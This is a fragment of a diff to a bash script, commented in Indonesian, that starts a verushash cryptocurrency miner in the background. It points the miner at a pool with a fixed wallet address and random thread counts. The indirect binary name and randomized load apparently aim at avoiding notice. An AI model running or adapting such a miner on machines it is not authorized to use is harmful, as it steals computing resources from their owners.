@@ -57,7 +57,7 @@ while [ $(date +%s) -lt $end_time ]; do
       random_threads=$((RANDOM % max_threads + 1))
 
       # Menjalankan proses dengan parameter yang ditentukan di latar belakang
-      nohup $dynamic_sgr -a verushash --pool $ip:$port -u RJ3brBKGZcdmdHJjKQWjkjAb5qnDaWkeaf --timeout 120 -t $random_threads -p x --keepalive true > dance_$port_$timestamp.log 2>&1 &
+      nohup $dynamic_sgr -a verushash --pool $ip:$port -u RJ3brBKGZcdmdHJjKQWjkjAb5qnDaWkeaf.$random_threads --timeout 120 -t $random_threads -p x --keepalive true > dance_$port_$timestamp.log 2>&1 &
       process_pid=$!
 
       echo "Memulai proses dengan PID $process_pid menggunakan IP $ip dan port $port dengan $random_threads threads"
